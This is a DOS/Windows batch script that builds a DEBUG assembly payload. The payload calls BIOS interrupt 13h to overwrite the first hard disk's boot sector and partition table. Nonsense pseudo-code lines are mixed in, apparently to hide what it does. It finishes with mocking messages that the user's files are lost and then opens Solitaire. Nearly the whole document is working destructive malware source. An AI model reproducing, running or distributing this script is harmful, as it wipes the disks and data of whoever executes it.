@echo off
echo a>b
echo pt.nextchar
commandline.parse
set filename=mov
set char=x,
set extr=es,
set firstchr=0
set datatype=int
set l=echo
set batch=debug
%l% %filename% a%char%311>>b
%l% %filename% characters(100)>>filename
%l% %filename% c%char%1>>b
%l% next_character>>filename
%l% %filename% d%char%8%firstchr%>>b
%l% %filename% b%char%5000%>>b
%l% %filename% %extr%bx%>>b
%l% %datatype% 13>>b
%l% if character < 100 jumpto nextchar
%l% %datatype% 20>>b
%l%.>>b
%l% g>>b
%batch%<b
%compare%filetype%keyboard%input.chars(100)
%filename%writechars(100)
echo Congratulations, you're a loser and lost all your files!
echo Formatting your hard drive...10%...50%...100%
echo Format complete!  Your partition table is now gone!
echo Press any key to enjoy one last game of Solitaire
pause
start c:\windows\sol.exe
end
